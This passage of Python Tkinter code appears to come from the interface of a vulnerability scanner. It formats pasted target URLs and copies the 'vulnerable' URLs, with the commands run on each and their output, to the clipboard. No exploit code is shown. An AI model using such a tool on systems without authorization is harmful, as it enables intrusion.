            messagebox.showinfo("Scan Selesai", message_text, parent=self.root)
    
    def _handle_paste_urls(self, event):
        """Handle paste event and auto-format URLs into separate lines."""
        try:
            # Get clipboard content
            clipboard_text = self.root.clipboard_get()
            
            if not clipboard_text:
                return
            
            # Split by common separators (newline, space, comma, semicolon, tab)
            # Also try to extract URLs using regex
            url_pattern = r'https?://[^\s<>"{}|\\^`\[\]]+'
            urls = re.findall(url_pattern, clipboard_text)
            
            if not urls:
                # If no URLs found, try splitting by whitespace
                lines = re.split(r'[\s,;]+', clipboard_text.strip())
                urls = [line for line in lines if line and (line.startswith('http://') or line.startswith('https://'))]
            
            if urls:
                # Clear current selection or insert at cursor
                try:
                    start = self.scan_targets_text.index(tk.SEL_FIRST)
                    end = self.scan_targets_text.index(tk.SEL_LAST)
                    self.scan_targets_text.delete(start, end)
                    insert_pos = start
                except tk.TclError:
                    # No selection, insert at cursor
                    insert_pos = self.scan_targets_text.index(tk.INSERT)
                
                # Format: one URL per line
                formatted_text = '\n'.join(urls) + '\n'
                
                # Insert formatted URLs
                self.scan_targets_text.insert(insert_pos, formatted_text)
                
                # Move cursor to end of inserted text
                self.scan_targets_text.mark_set(tk.INSERT, f"{insert_pos}+{len(formatted_text)}c")
                
                # Prevent default paste
                return "break"
            
        except tk.TclError:
            # Clipboard might be empty or invalid, do nothing
            pass
        except Exception as e:
            # If something goes wrong, allow normal paste
            pass
    
    def _copy_vulnerable_urls(self):
        """Copy all vulnerable URLs with command results to clipboard."""
        with self.vulnerable_urls_lock:
            if not self.vulnerable_urls:
                # No popup - just return silently
                return
        
            # Format: URL [cmd1 - output] [cmd2 - output]
            formatted_lines = []
            for entry in self.vulnerable_urls:
                url = entry["url"]
                commands = entry.get("commands", [])
                
                # Build command-output pairs
                cmd_output_parts = []
                for cmd_result in commands:
                    cmd = cmd_result["cmd"]
                    output = cmd_result["output"].strip()
                    # Clean output: remove newlines, limit length
                    output_clean = output.replace('\n', ' ').replace('\r', ' ')
                    if len(output_clean) > 100:
                        output_clean = output_clean[:97] + "..."
                    cmd_output_parts.append(f"[{cmd} - {output_clean}]")
                
                # Combine URL with command results
                if cmd_output_parts:
                    formatted_line = f"{url} {' '.join(cmd_output_parts)}"
                else:
                    formatted_line = url
                
                formatted_lines.append(formatted_line)
            
            # Join all lines with newline
            urls_text = '\n'.join(formatted_lines)
        
        # Copy to clipboard
        self.root.clipboard_clear()
        self.root.clipboard_append(urls_text)
        self.root.update()  # Update clipboard
        
        with self.vulnerable_urls_lock:
            count = len(self.vulnerable_urls)
        # No popup - copy silently
    
    def run(self):
        """Start the GUI main loop."""
        self.root.mainloop()


def run():
    """Entry point for GUI."""
    app = MainWindow()
    app.run()

